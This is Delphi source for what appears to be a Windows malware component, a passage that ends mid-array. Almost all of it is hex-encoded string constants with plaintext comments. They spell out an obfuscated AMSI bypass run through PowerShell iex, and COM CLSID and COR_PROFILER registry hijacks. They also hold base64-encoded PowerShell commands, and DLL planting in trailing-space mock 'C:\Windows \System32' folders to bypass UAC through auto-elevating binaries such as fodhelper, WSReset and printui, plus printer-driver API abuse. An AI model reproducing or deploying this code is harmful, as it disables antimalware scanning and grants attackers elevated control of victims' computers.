unit CodeUnitDLL;

interface

uses System.SysUtils, GetLibModHandleDLL;

type
  DWORD = LongWord;
  LPSTR = MarshaledAString;
  LPWSTR = PWideChar;
  LPCWSTR = PWideChar;
  BOOL = LongBool;
  _DRIVER_INFO_2W = record
    cVersion: DWORD;
    pName: LPWSTR;
    pEnvironment: LPWSTR;
    pDriverPath: LPWSTR;
    pDataFile: LPWSTR;
    pConfigFile: LPWSTR;
  end;
  DRIVER_INFO_2 = _DRIVER_INFO_2W;

  PSecurityAttributes = ^TSecurityAttributes;
  _SECURITY_ATTRIBUTES = record
    nLength: DWORD;
    lpSecurityDescriptor: Pointer;
    bInheritHandle: BOOL;
  end;
  {$EXTERNALSYM _SECURITY_ATTRIBUTES}
  TSecurityAttributes = _SECURITY_ATTRIBUTES;
  SECURITY_ATTRIBUTES = _SECURITY_ATTRIBUTES;
  {$EXTERNALSYM SECURITY_ATTRIBUTES}

const
  // kernel32.dll
  HSH0:Array[0..11] of string=('6B','65','72','6E','65','6C','33','32','2E','64','6C','6C');
  // shell32.dll
  HSH1:Array[0..10] of string=('73','68','65','6C','6C','33','32','2E','64','6C','6C');
  // ShellExecuteW
  HSH2:Array[0..12] of string=('53','68','65','6C','6C','45','78','65','63','75','74','65','57');
  // Wow64DisableWow64FsRedirection
  HSH3:Array[0..29] of string=('57','6F','77','36','34','44','69','73','61','62','6C','65','57','6F','77',
  '36','34','46','73','52','65','64','69','72','65','63','74','69','6F','6E');
  // Wow64RevertWow64FsRedirection
  HSH4:Array[0..28] of string=('57','6F','77','36','34','52','65','76','65','72','74','57','6F','77','36',
  '34','46','73','52','65','64','69','72','65','63','74','69','6F','6E');
  // RemoveDirectoryW
  HSH5:Array[0..15] of string=('52','65','6D','6F','76','65','44','69','72','65','63','74','6F','72','79',
  '57');
  // CopyFileW
  HSH6:Array[0..8] of string=('43','6F','70','79','46','69','6C','65','57');
  // CreateDirectoryW
  HSH7:Array[0..15] of string=('43','72','65','61','74','65','44','69','72','65','63','74','6F','72','79',
  '57');
  // AddPrinterDriverExW
  HSH8:Array[0..18] of string=('41','64','64','50','72','69','6E','74','65','72','44','72','69','76','65',
  '72','45','78','57');
  // winspool.drv
  HSH9:Array[0..11] of string=('77','69','6E','73','70','6F','6F','6C','2E','64','72','76');
  // Powershell
  HCOM:Array[0..9] of string=('50','6F','77','65','72','73','68','65','6C','6C');
  // -C $FEIfwuioehfaiwyYOETWTRuwye = 'a'+'ms'+'iI'+'ni'+'tF'+'a'; $EF8034uowieypowiue = 'il'+'ed'; $Ceoiuwjoeuyfw = 'Sy'+'st'+'em.Ma'+'na'+'gem'+'ent.'+'Aut'+'omat'+'io'+'n.A'+'ms'+'iUt'+'ils';$DFiowjhOHWOHEOUF = $null; sleep 1; $text = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('W1JlZl0uQXNzZW1ibHkuR2V0VHlwZSgkQ2VvaXV3am9ldXlmdykuR2V0RmllbGQoJEZFSWZ3dWlvZWhmYWl3eVlPRVRXVFJ1d3llICsgJEVGODAzNHVvd2lleXBvd2l1ZSwiTm9uUCIgKyAidWIiICsgImxpYyxTdCIgKyAiYXRpYyIpLlNldFZhbHVlKCRERmlvd2poT0hXT0hFT1VGLCR0cnVlKQ==')); iex $text; sleep 1; New-Item -Path 'HKCU:\Software\Classes\CLSID\{B29D466A-857D-35BA-8712-A758861BFEA1}' -Force; New-Item -Path 'HKCU:\Software\Classes\CLSID\{B29D466A-857D-35BA-8712-A758861BFEA1}\InprocServer32' -Force; New-ItemProperty -Path 'HKCU:\Software\Classes\CLSID\{B29D466A-857D-35BA-8712-A758861BFEA1}\InprocServer32' -Name '(default)' -Value '
  HCOM1:Array[0..892] of string=('2D','43','20','24','46','45','49','66','77','75','69','6F','65','68','66',
  '61','69','77','79','59','4F','45','54','57','54','52','75','77','79','65',
  '20','3D','20','27','61','27','2B','27','6D','73','27','2B','27','69','49',
  '27','2B','27','6E','69','27','2B','27','74','46','27','2B','27','61','27',
  '3B','20','24','45','46','38','30','33','34','75','6F','77','69','65','79',
  '70','6F','77','69','75','65','20','3D','20','27','69','6C','27','2B','27',
  '65','64','27','3B','20','24','43','65','6F','69','75','77','6A','6F','65',
  '75','79','66','77','20','3D','20','27','53','79','27','2B','27','73','74',
  '27','2B','27','65','6D','2E','4D','61','27','2B','27','6E','61','27','2B',
  '27','67','65','6D','27','2B','27','65','6E','74','2E','27','2B','27','41',
  '75','74','27','2B','27','6F','6D','61','74','27','2B','27','69','6F','27',
  '2B','27','6E','2E','41','27','2B','27','6D','73','27','2B','27','69','55',
  '74','27','2B','27','69','6C','73','27','3B','24','44','46','69','6F','77',
  '6A','68','4F','48','57','4F','48','45','4F','55','46','20','3D','20','24',
  '6E','75','6C','6C','3B','20','73','6C','65','65','70','20','31','3B','20',
  '24','74','65','78','74','20','3D','20','5B','53','79','73','74','65','6D',
  '2E','54','65','78','74','2E','45','6E','63','6F','64','69','6E','67','5D',
  '3A','3A','41','53','43','49','49','2E','47','65','74','53','74','72','69',
  '6E','67','28','5B','53','79','73','74','65','6D','2E','43','6F','6E','76',
  '65','72','74','5D','3A','3A','46','72','6F','6D','42','61','73','65','36',
  '34','53','74','72','69','6E','67','28','27','57','31','4A','6C','5A','6C',
  '30','75','51','58','4E','7A','5A','57','31','69','62','48','6B','75','52',
  '32','56','30','56','48','6C','77','5A','53','67','6B','51','32','56','76',
  '61','58','56','33','61','6D','39','6C','64','58','6C','6D','64','79','6B',
  '75','52','32','56','30','52','6D','6C','6C','62','47','51','6F','4A','45',
  '5A','46','53','57','5A','33','64','57','6C','76','5A','57','68','6D','59',
  '57','6C','33','65','56','6C','50','52','56','52','58','56','46','4A','31',
  '64','33','6C','6C','49','43','73','67','4A','45','56','47','4F','44','41',
  '7A','4E','48','56','76','64','32','6C','6C','65','58','42','76','64','32',
  '6C','31','5A','53','77','69','54','6D','39','75','55','43','49','67','4B',
  '79','41','69','64','57','49','69','49','43','73','67','49','6D','78','70',
  '59','79','78','54','64','43','49','67','4B','79','41','69','59','58','52',
  '70','59','79','49','70','4C','6C','4E','6C','64','46','5A','68','62','48',
  '56','6C','4B','43','52','45','52','6D','6C','76','64','32','70','6F','54',
  '30','68','58','54','30','68','46','54','31','56','47','4C','43','52','30',
  '63','6E','56','6C','4B','51','3D','3D','27','29','29','3B','20','69','65',
  '78','20','24','74','65','78','74','3B','20','73','6C','65','65','70','20',
  '31','3B','20','4E','65','77','2D','49','74','65','6D','20','2D','50','61',
  '74','68','20','27','48','4B','43','55','3A','5C','53','6F','66','74','77',
  '61','72','65','5C','43','6C','61','73','73','65','73','5C','43','4C','53',
  '49','44','5C','7B','42','32','39','44','34','36','36','41','2D','38','35',
  '37','44','2D','33','35','42','41','2D','38','37','31','32','2D','41','37',
  '35','38','38','36','31','42','46','45','41','31','7D','27','20','2D','46',
  '6F','72','63','65','3B','20','4E','65','77','2D','49','74','65','6D','20',
  '2D','50','61','74','68','20','27','48','4B','43','55','3A','5C','53','6F',
  '66','74','77','61','72','65','5C','43','6C','61','73','73','65','73','5C',
  '43','4C','53','49','44','5C','7B','42','32','39','44','34','36','36','41',
  '2D','38','35','37','44','2D','33','35','42','41','2D','38','37','31','32',
  '2D','41','37','35','38','38','36','31','42','46','45','41','31','7D','5C',
  '49','6E','70','72','6F','63','53','65','72','76','65','72','33','32','27',
  '20','2D','46','6F','72','63','65','3B','20','4E','65','77','2D','49','74',
  '65','6D','50','72','6F','70','65','72','74','79','20','2D','50','61','74',
  '68','20','27','48','4B','43','55','3A','5C','53','6F','66','74','77','61',
  '72','65','5C','43','6C','61','73','73','65','73','5C','43','4C','53','49',
  '44','5C','7B','42','32','39','44','34','36','36','41','2D','38','35','37',
  '44','2D','33','35','42','41','2D','38','37','31','32','2D','41','37','35',
  '38','38','36','31','42','46','45','41','31','7D','5C','49','6E','70','72',
  '6F','63','53','65','72','76','65','72','33','32','27','20','2D','4E','61',
  '6D','65','20','27','28','64','65','66','61','75','6C','74','29','27','20',
  '2D','56','61','6C','75','65','20','27');
  // ' -PropertyType ExpandString -Force;
  HCOM2:Array[0..36] of string=('27','20','2D','50','72','6F','70','65','72','74','79','54','79','70','65',
  '20','45','78','70','61','6E','64','53','74','72','69','6E','67','20','2D',
  '46','6F','72','63','65','3B','20');
  // $BBB = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('U2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAnSEtDVTpcRW52aXJvbm1lbnQnIC1OYW1lICdDT1JfUFJPRklMRVInIC1WYWx1ZSAne0IyOUQ0NjZBLTg1N0QtMzVCQS04NzEyLUE3NTg4NjFCRkVBMX0nIC1Gb3JjZTsgU2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAnSEtDVTpcRW52aXJvbm1lbnQnIC1OYW1lICdDT1JfRU5BQkxFX1BST0ZJTElORycgLVZhbHVlICcxJyAtRm9yY2U7')); $CCC = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($BBB)); powershell -E $CCC;
  HCOM3:Array[0..446] of string=('24','42','42','42','20','3D','20','5B','54','65','78','74','2E','45','6E',
  '63','6F','64','69','6E','67','5D','3A','3A','55','74','66','38','2E','47',
  '65','74','53','74','72','69','6E','67','28','5B','43','6F','6E','76','65',
  '72','74','5D','3A','3A','46','72','6F','6D','42','61','73','65','36','34',
  '53','74','72','69','6E','67','28','27','55','32','56','30','4C','55','6C',
  '30','5A','57','31','51','63','6D','39','77','5A','58','4A','30','65','53',
  '41','74','55','47','46','30','61','43','41','6E','53','45','74','44','56',
  '54','70','63','52','57','35','32','61','58','4A','76','62','6D','31','6C',
  '62','6E','51','6E','49','43','31','4F','59','57','31','6C','49','43','64',
  '44','54','31','4A','66','55','46','4A','50','52','6B','6C','4D','52','56',
  '49','6E','49','43','31','57','59','57','78','31','5A','53','41','6E','65',
  '30','49','79','4F','55','51','30','4E','6A','5A','42','4C','54','67','31',
  '4E','30','51','74','4D','7A','56','43','51','53','30','34','4E','7A','45',
  '79','4C','55','45','33','4E','54','67','34','4E','6A','46','43','52','6B',
  '56','42','4D','58','30','6E','49','43','31','47','62','33','4A','6A','5A',
  '54','73','67','55','32','56','30','4C','55','6C','30','5A','57','31','51',
  '63','6D','39','77','5A','58','4A','30','65','53','41','74','55','47','46',
  '30','61','43','41','6E','53','45','74','44','56','54','70','63','52','57',
  '35','32','61','58','4A','76','62','6D','31','6C','62','6E','51','6E','49',
  '43','31','4F','59','57','31','6C','49','43','64','44','54','31','4A','66',
  '52','55','35','42','51','6B','78','46','58','31','42','53','54','30','5A',
  '4A','54','45','6C','4F','52','79','63','67','4C','56','5A','68','62','48',
  '56','6C','49','43','63','78','4A','79','41','74','52','6D','39','79','59',
  '32','55','37','27','29','29','3B','20','24','43','43','43','20','3D','20',
  '5B','43','6F','6E','76','65','72','74','5D','3A','3A','54','6F','42','61',
  '73','65','36','34','53','74','72','69','6E','67','28','5B','54','65','78',
  '74','2E','45','6E','63','6F','64','69','6E','67','5D','3A','3A','55','6E',
  '69','63','6F','64','65','2E','47','65','74','42','79','74','65','73','28',
  '24','42','42','42','29','29','3B','20','70','6F','77','65','72','73','68',
  '65','6C','6C','20','2D','45','20','24','43','43','43','3B');
  // Set-ItemProperty -Path 'HKCU:\Environment' -Name 'COR_PROFILER_PATH' -Value '
  HCOM4:Array[0..76] of string=('53','65','74','2D','49','74','65','6D','50','72','6F','70','65','72','74',
  '79','20','2D','50','61','74','68','20','27','48','4B','43','55','3A','5C',
  '45','6E','76','69','72','6F','6E','6D','65','6E','74','27','20','2D','4E',
  '61','6D','65','20','27','43','4F','52','5F','50','52','4F','46','49','4C',
  '45','52','5F','50','41','54','48','27','20','2D','56','61','6C','75','65',
  '20','27');
  // ' -Force;
  HCOM5:Array[0..8] of string=('27','20','2D','46','6F','72','63','65','3B');
  // $BB = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('U3RhcnQtUHJvY2VzcyAnZ3BlZGl0Lm1zYyc7')); $CC = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($BB)); powershell -E $CC;
  HCOM6:Array[0..198] of string=('24','42','42','20','3D','20','5B','54','65','78','74','2E','45','6E','63',
  '6F','64','69','6E','67','5D','3A','3A','55','74','66','38','2E','47','65',
  '74','53','74','72','69','6E','67','28','5B','43','6F','6E','76','65','72',
  '74','5D','3A','3A','46','72','6F','6D','42','61','73','65','36','34','53',
  '74','72','69','6E','67','28','27','55','33','52','68','63','6E','51','74',
  '55','48','4A','76','59','32','56','7A','63','79','41','6E','5A','33','42',
  '6C','5A','47','6C','30','4C','6D','31','7A','59','79','63','37','27','29',
  '29','3B','20','24','43','43','20','3D','20','5B','43','6F','6E','76','65',
  '72','74','5D','3A','3A','54','6F','42','61','73','65','36','34','53','74',
  '72','69','6E','67','28','5B','54','65','78','74','2E','45','6E','63','6F',
  '64','69','6E','67','5D','3A','3A','55','6E','69','63','6F','64','65','2E',
  '47','65','74','42','79','74','65','73','28','24','42','42','29','29','3B',
  '20','70','6F','77','65','72','73','68','65','6C','6C','20','2D','45','20',
  '24','43','43','3B');
  // C:\Windows\System32\DriverStore\FileRepository\*
  HCOM7:Array[0..47] of string=('43','3A','5C','57','69','6E','64','6F','77','73','5C','53','79','73','74',
  '65','6D','33','32','5C','44','72','69','76','65','72','53','74','6F','72',
  '65','5C','46','69','6C','65','52','65','70','6F','73','69','74','6F','72',
  '79','5C','2A');
  // C:\Windows\System32\DriverStore\FileRepository\
  HCOM8:Array[0..46] of string=('43','3A','5C','57','69','6E','64','6F','77','73','5C','53','79','73','74',
  '65','6D','33','32','5C','44','72','69','76','65','72','53','74','6F','72',
  '65','5C','46','69','6C','65','52','65','70','6F','73','69','74','6F','72',
  '79','5C');
  // \Amd64\
  HCOM9:Array[0..6] of string=('5C','41','6D','64','36','34','5C');
  // UNIDRV.DLL
  HCOM10:Array[0..9] of string=('55','4E','49','44','52','56','2E','44','4C','4C');
  // QDRV
  HCOM11:Array[0..3] of string=('51','44','52','56');
  // C:\Windows\System32\kernelbase.dll
  HCOM12:Array[0..33] of string=('43','3A','5C','57','69','6E','64','6F','77','73','5C','53','79','73','74',
  '65','6D','33','32','5C','6B','65','72','6E','65','6C','62','61','73','65',
  '2E','64','6C','6C');
    // \\?\C:\Windows
  HCOM13:Array[0..14] of string=('5C','5C','3F','5C','43','3A','5C','57','69','6E','64','6F','77','73','20');
  // \\?\C:\Windows \System32
  HCOM14:Array[0..23] of string=('5C','5C','3F','5C','43','3A','5C','57','69','6E','64','6F','77','73','20',
  '5C','53','79','73','74','65','6D','33','32');
  // C:\Windows\System32\printui.exe
  HCOM15:Array[0..30] of string=('43','3A','5C','57','69','6E','64','6F','77','73','5C','53','79','73','74',
  '65','6D','33','32','5C','70','72','69','6E','74','75','69','2E','65','78',
  '65');
  // \\?\C:\Windows \System32\printui.exe
  HCOM16:Array[0..35] of string=('5C','5C','3F','5C','43','3A','5C','57','69','6E','64','6F','77','73','20',
  '5C','53','79','73','74','65','6D','33','32','5C','70','72','69','6E','74',
  '75','69','2E','65','78','65');
  // \\?\C:\Windows \System32\printui.dll
  HCOM17:Array[0..35] of string=('5C','5C','3F','5C','43','3A','5C','57','69','6E','64','6F','77','73','20',
  '5C','53','79','73','74','65','6D','33','32','5C','70','72','69','6E','74',
  '75','69','2E','64','6C','6C');
  // C:\Windows \System32\printui.exe
  HCOM18:Array[0..31] of string=('43','3A','5C','57','69','6E','64','6F','77','73','20','5C','53','79','73',
  '74','65','6D','33','32','5C','70','72','69','6E','74','75','69','2E','65',
  '78','65');
  // open
  HCOM19:Array[0..3] of string=('6F','70','65','6E');
  // C:\Windows \System32\printui.dll
  HCOM20:Array[0..31] of string=('43','3A','5C','57','69','6E','64','6F','77','73','20','5C','53','79','73',
  '74','65','6D','33','32','5C','70','72','69','6E','74','75','69','2E','64',
  '6C','6C');
  // C:\Windows \System32\printui.exe
  HCOM21:Array[0..31] of string=('43','3A','5C','57','69','6E','64','6F','77','73','20','5C','53','79','73',
  '74','65','6D','33','32','5C','70','72','69','6E','74','75','69','2E','65',
  '78','65');
  // C:\Windows\System32\netplwiz.exe
  HCOM22:Array[0..31] of string=('43','3A','5C','57','69','6E','64','6F','77','73','5C','53','79','73','74',
  '65','6D','33','32','5C','6E','65','74','70','6C','77','69','7A','2E','65',
  '78','65');
  // \\?\C:\Windows \System32\netplwiz.exe
  HCOM23:Array[0..36] of string=('5C','5C','3F','5C','43','3A','5C','57','69','6E','64','6F','77','73','20',
  '5C','53','79','73','74','65','6D','33','32','5C','6E','65','74','70','6C',
  '77','69','7A','2E','65','78','65');
  // \\?\C:\Windows \System32\netutils.dll
  HCOM24:Array[0..36] of string=('5C','5C','3F','5C','43','3A','5C','57','69','6E','64','6F','77','73','20',
  '5C','53','79','73','74','65','6D','33','32','5C','6E','65','74','75','74',
  '69','6C','73','2E','64','6C','6C');
  // C:\Windows \System32\netplwiz.exe
  HCOM25:Array[0..32] of string=('43','3A','5C','57','69','6E','64','6F','77','73','20','5C','53','79','73',
  '74','65','6D','33','32','5C','6E','65','74','70','6C','77','69','7A','2E',
  '65','78','65');
  // C:\Windows \System32\netutils.dll
  HCOM26:Array[0..32] of string=('43','3A','5C','57','69','6E','64','6F','77','73','20','5C','53','79','73',
  '74','65','6D','33','32','5C','6E','65','74','75','74','69','6C','73','2E',
  '64','6C','6C');
  // C:\Windows \System32\netplwiz.exe
  HCOM27:Array[0..32] of string=('43','3A','5C','57','69','6E','64','6F','77','73','20','5C','53','79','73',
  '74','65','6D','33','32','5C','6E','65','74','70','6C','77','69','7A','2E',
  '65','78','65');
  // C:\Windows\System32\fsquirt.exe
  HCOM28:Array[0..30] of string=('43','3A','5C','57','69','6E','64','6F','77','73','5C','53','79','73','74',
  '65','6D','33','32','5C','66','73','71','75','69','72','74','2E','65','78',
  '65');
  // \\?\C:\Windows \System32\fsquirt.exe
  HCOM29:Array[0..35] of string=('5C','5C','3F','5C','43','3A','5C','57','69','6E','64','6F','77','73','20',
  '5C','53','79','73','74','65','6D','33','32','5C','66','73','71','75','69',
  '72','74','2E','65','78','65');
  // \\?\C:\Windows \System32\dwmapi.dll
  HCOM30:Array[0..34] of string=('5C','5C','3F','5C','43','3A','5C','57','69','6E','64','6F','77','73','20',
  '5C','53','79','73','74','65','6D','33','32','5C','64','77','6D','61','70',
  '69','2E','64','6C','6C');
  // -C Start-Process 'C:\Windows \System32\fsquirt.exe' -Verb RunAs;
  HCOM31:Array[0..63] of string=('2D','43','20','53','74','61','72','74','2D','50','72','6F','63','65','73',
  '73','20','27','43','3A','5C','57','69','6E','64','6F','77','73','20','5C',
  '53','79','73','74','65','6D','33','32','5C','66','73','71','75','69','72',
  '74','2E','65','78','65','27','20','2D','56','65','72','62','20','52','75',
  '6E','41','73','3B');
  // C:\Windows \System32\dwmapi.dll
  HCOM32:Array[0..30] of string=('43','3A','5C','57','69','6E','64','6F','77','73','20','5C','53','79','73',
  '74','65','6D','33','32','5C','64','77','6D','61','70','69','2E','64','6C',
  '6C');
  // C:\Windows \System32\fsquirt.exe
  HCOM33:Array[0..31] of string=('43','3A','5C','57','69','6E','64','6F','77','73','20','5C','53','79','73',
  '74','65','6D','33','32','5C','66','73','71','75','69','72','74','2E','65',
  '78','65');
  const
  // C:\Windows\System32\WSReset.exe
  HCOM34:Array[0..30] of string=('43','3A','5C','57','69','6E','64','6F','77','73','5C','53','79','73','74',
  '65','6D','33','32','5C','57','53','52','65','73','65','74','2E','65','78',
  '65');
  // \\?\C:\Windows \System32\WSReset.exe
  HCOM35:Array[0..35] of string=('5C','5C','3F','5C','43','3A','5C','57','69','6E','64','6F','77','73','20',
  '5C','53','79','73','74','65','6D','33','32','5C','57','53','52','65','73',
  '65','74','2E','65','78','65');
  // \\?\C:\Windows \System32\licensemanagerapi.dll
  HCOM36:Array[0..45] of string=('5C','5C','3F','5C','43','3A','5C','57','69','6E','64','6F','77','73','20',
  '5C','53','79','73','74','65','6D','33','32','5C','6C','69','63','65','6E',
  '73','65','6D','61','6E','61','67','65','72','61','70','69','2E','64','6C',
  '6C');
  // C:\Windows \System32\WSReset.exe
  HCOM37:Array[0..31] of string=('43','3A','5C','57','69','6E','64','6F','77','73','20','5C','53','79','73',
  '74','65','6D','33','32','5C','57','53','52','65','73','65','74','2E','65',
  '78','65');
  // C:\Windows \System32\licensemanagerapi.dll
  HCOM38:Array[0..41] of string=('43','3A','5C','57','69','6E','64','6F','77','73','20','5C','53','79','73',
  '74','65','6D','33','32','5C','6C','69','63','65','6E','73','65','6D','61',
  '6E','61','67','65','72','61','70','69','2E','64','6C','6C');
  // C:\Windows \System32\WSReset.exe
  HCOM39:Array[0..31] of string=('43','3A','5C','57','69','6E','64','6F','77','73','20','5C','53','79','73',
  '74','65','6D','33','32','5C','57','53','52','65','73','65','74','2E','65',
  '78','65');
  // C:\Windows\System32\djoin.exe
  HCOM40:Array[0..28] of string=('43','3A','5C','57','69','6E','64','6F','77','73','5C','53','79','73','74',
  '65','6D','33','32','5C','64','6A','6F','69','6E','2E','65','78','65');
  // \\?\C:\Windows \System32\djoin.exe
  HCOM41:Array[0..33] of string=('5C','5C','3F','5C','43','3A','5C','57','69','6E','64','6F','77','73','20',
  '5C','53','79','73','74','65','6D','33','32','5C','64','6A','6F','69','6E',
  '2E','65','78','65');
  // \\?\C:\Windows \System32\dbgcore.dll
  HCOM42:Array[0..35] of string=('5C','5C','3F','5C','43','3A','5C','57','69','6E','64','6F','77','73','20',
  '5C','53','79','73','74','65','6D','33','32','5C','64','62','67','63','6F',
  '72','65','2E','64','6C','6C');
  // -C Start-Process 'C:\Windows \System32\djoin.exe' -Verb RunAs;
  HCOM43:Array[0..61] of string=('2D','43','20','53','74','61','72','74','2D','50','72','6F','63','65','73',
  '73','20','27','43','3A','5C','57','69','6E','64','6F','77','73','20','5C',
  '53','79','73','74','65','6D','33','32','5C','64','6A','6F','69','6E','2E',
  '65','78','65','27','20','2D','56','65','72','62','20','52','75','6E','41',
  '73','3B');
  // C:\Windows \System32\dbgcore.dll
  HCOM44:Array[0..31] of string=('43','3A','5C','57','69','6E','64','6F','77','73','20','5C','53','79','73',
  '74','65','6D','33','32','5C','64','62','67','63','6F','72','65','2E','64',
  '6C','6C');
  // C:\Windows \System32\djoin.exe
  HCOM45:Array[0..29] of string=('43','3A','5C','57','69','6E','64','6F','77','73','20','5C','53','79','73',
  '74','65','6D','33','32','5C','64','6A','6F','69','6E','2E','65','78','65');
  // C:\Windows\System32\OptionalFeatures.exe
  HCOM46:Array[0..39] of string=('43','3A','5C','57','69','6E','64','6F','77','73','5C','53','79','73','74',
  '65','6D','33','32','5C','4F','70','74','69','6F','6E','61','6C','46','65',
  '61','74','75','72','65','73','2E','65','78','65');
  // \\?\C:\Windows \System32\OptionalFeatures.exe
  HCOM47:Array[0..44] of string=('5C','5C','3F','5C','43','3A','5C','57','69','6E','64','6F','77','73','20',
  '5C','53','79','73','74','65','6D','33','32','5C','4F','70','74','69','6F',
  '6E','61','6C','46','65','61','74','75','72','65','73','2E','65','78','65');
  // \\?\C:\Windows \System32\DUI70.dll
  HCOM48:Array[0..33] of string=('5C','5C','3F','5C','43','3A','5C','57','69','6E','64','6F','77','73','20',
  '5C','53','79','73','74','65','6D','33','32','5C','44','55','49','37','30',
  '2E','64','6C','6C');
  // C:\Windows \System32\OptionalFeatures.exe
  HCOM49:Array[0..40] of string=('43','3A','5C','57','69','6E','64','6F','77','73','20','5C','53','79','73',
  '74','65','6D','33','32','5C','4F','70','74','69','6F','6E','61','6C','46',
  '65','61','74','75','72','65','73','2E','65','78','65');
  // C:\Windows \System32\DUI70.dll
  HCOM50:Array[0..29] of string=('43','3A','5C','57','69','6E','64','6F','77','73','20','5C','53','79','73',
  '74','65','6D','33','32','5C','44','55','49','37','30','2E','64','6C','6C');
  // C:\Windows \System32\OptionalFeatures.exe
  HCOM51:Array[0..40] of string=('43','3A','5C','57','69','6E','64','6F','77','73','20','5C','53','79','73',
  '74','65','6D','33','32','5C','4F','70','74','69','6F','6E','61','6C','46',
  '65','61','74','75','72','65','73','2E','65','78','65');
  // C:\Windows\System32\fodhelper.exe
  HCOM52:Array[0..32] of string=('43','3A','5C','57','69','6E','64','6F','77','73','5C','53','79','73','74',
  '65','6D','33','32','5C','66','6F','64','68','65','6C','70','65','72','2E',
  '65','78','65');
  // \\?\C:\Windows \System32\fodhelper.exe
  HCOM53:Array[0..37] of string=('5C','5C','3F','5C','43','3A','5C','57','69','6E','64','6F','77','73','20',
  '5C','53','79','73','74','65','6D','33','32','5C','66','6F','64','68','65',
  '6C','70','65','72','2E','65','78','65');
  // \\?\C:\Windows \System32\PROPSYS.dll
  HCOM54:Array[0..35] of string=('5C','5C','3F','5C','43','3A','5C','57','69','6E','64','6F','77','73','20',
  '5C','53','79','73','74','65','6D','33','32','5C','50','52','4F','50','53',
  '59','53','2E','64','6C','6C');
  // C:\Windows \System32\fodhelper.exe
  HCOM55:Array[0..33] of string=('43','3A','5C','57','69','6E','64','6F','77','73','20','5C','53','79','73',
  '74','65','6D','33','32','5C','66','6F','64','68','65','6C','70','65','72',
  '2E','65','78','65');
  // C:\Windows \System32\PROPSYS.dll
  HCOM56:Array[0..31] of string=('43','3A','5C','57','69','6E','64','6F','77','73','20','5C','53','79','73',
  '74','65','6D','33','32','5C','50','52','4F','50','53','59','53','2E','64',
  '6C','6C');
  // C:\Windows \System32\fodhelper.exe
  HCOM57:Array[0..33] of string=('43','3A','5C','57','69','6E','64','6F','77','73','20','5C','53','79','73',
  '74','65','6D','33','32','5C','66','6F','64','68','65','6C','70','65','72',
  '2E','65','78','65');
  // C:\Windows\System32\SystemPropertiesAdvanced.exe
  HCOM58:Array[0..47] of string=('43','3A','5C','57','69','6E','64','6F','77','73','5C','53','79','73','74',
  '65','6D','33','32','5C','53','79','73','74','65','6D','50','72','6F','70',
  '65','72','74','69','65','73','41','64','76','61','6E','63','65','64','2E',
  '65','78','65');
  // \\?\C:\Windows \System32\SystemPropertiesAdvanced.exe
  HCOM59:Array[0..52] of string=('5C','5C','3F','5C','43','3A','5C','57','69','6E','64','6F','77','73','20',
  '5C','53','79','73','74','65','6D','33','32','5C','53','79','73','74','65',
  '6D','50','72','6F','70','65','72','74','69','65','73','41','64','76','61',
  '6E','63','65','64','2E','65','78','65');
  // \\?\C:\Windows \System32\netid.dll
  HCOM60:Array[0..33] of string=('5C','5C','3F','5C','43','3A','5C','57','69','6E','64','6F','77','73','20',
  '5C','53','79','73','74','65','6D','33','32','5C','6E','65','74','69','64',
  '2E','64','6C','6C');
  // C:\Windows \System32\SystemPropertiesAdvanced.exe
  HCOM61:Array[0..48] of string=('43','3A','5C','57','69','6E','64','6F','77','73','20','5C','53','79','73',
  '74','65','6D','33','32','5C','53','79','73','74','65','6D','50','72','6F',
  '70','65','72','74','69','65','73','41','64','76','61','6E','63','65','64',
  '2E','65','78','65');
  // C:\Windows \System32\netid.dll
  HCOM62:Array[0..29] of string=('43','3A','5C','57','69','6E','64','6F','77','73','20','5C','53','79','73',
  '74','65','6D','33','32','5C','6E','65','74','69','64','2E','64','6C','6C');
  // C:\Windows \System32\SystemPropertiesAdvanced.exe
  HCOM63:Array[0..48] of string=('43','3A','5C','57','69','6E','64','6F','77','73','20','5C','53','79','73',
  '74','65','6D','33','32','5C','53','79','73','74','65','6D','50','72','6F',
  '70','65','72','74','69','65','73','41','64','76','61','6E','63','65','64',
  '2E','65','78','65');
  // sleep 1; $BB = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('U2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAnSEtDVTpcU29mdHdhcmVcQ2xhc3Nlc1xDTFNJRFx7QjI5RDQ2NkEtODU3RC0zNUJBLTg3MTItQTc1ODg2MUJGRUExfVxJbnByb2NTZXJ2ZXIzMicgLU5hbWUgJyhkZWZhdWx0KScgLVZhbHVlICcnOyBSZW1vdmUtSXRlbVByb3BlcnR5IC1QYXRoICdIS0NVOlxFbnZpcm9ubWVudCcgLU5hbWUgJ0NPUl9QUk9GSUxFUic7IFJlbW92ZS1JdGVtUHJvcGVydHkgLVBhdGggJ0hLQ1U6XEVudmlyb25tZW50JyAtTmFtZSAnQ09SX0VOQUJMRV9QUk9GSUxJTkcnOyBSZW1vdmUtSXRlbVByb3BlcnR5IC1QYXRoICdIS0NVOlxFbnZpcm9ubWVudCcgLU5hbWUgJ0NPUl9QUk9GSUxFUl9QQVRIJzsg')); $CC = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($BB)); powershell -E $CC;
  HCOM64:Array[0..643] of string=('73','6C','65','65','70','20','31','3B','20','24','42','42','20','3D','20',
  '5B','54','65','78','74','2E','45','6E','63','6F','64','69','6E','67','5D',
  '3A','3A','55','74','66','38','2E','47','65','74','53','74','72','69','6E',
  '67','28','5B','43','6F','6E','76','65','72','74','5D','3A','3A','46','72',
  '6F','6D','42','61','73','65','36','34','53','74','72','69','6E','67','28',
  '27','55','32','56','30','4C','55','6C','30','5A','57','31','51','63','6D',
  '39','77','5A','58','4A','30','65','53','41','74','55','47','46','30','61',
  '43','41','6E','53','45','74','44','56','54','70','63','55','32','39','6D',
  '64','48','64','68','63','6D','56','63','51','32','78','68','63','33','4E',
  '6C','63','31','78','44','54','46','4E','4A','52','46','78','37','51','6A',
  '49','35','52','44','51','32','4E','6B','45','74','4F','44','55','33','52',
  '43','30','7A','4E','55','4A','42','4C','54','67','33','4D','54','49','74',
  '51','54','63','31','4F','44','67','32','4D','55','4A','47','52','55','45',
  '78','66','56','78','4A','62','6E','42','79','62','32','4E','54','5A','58',
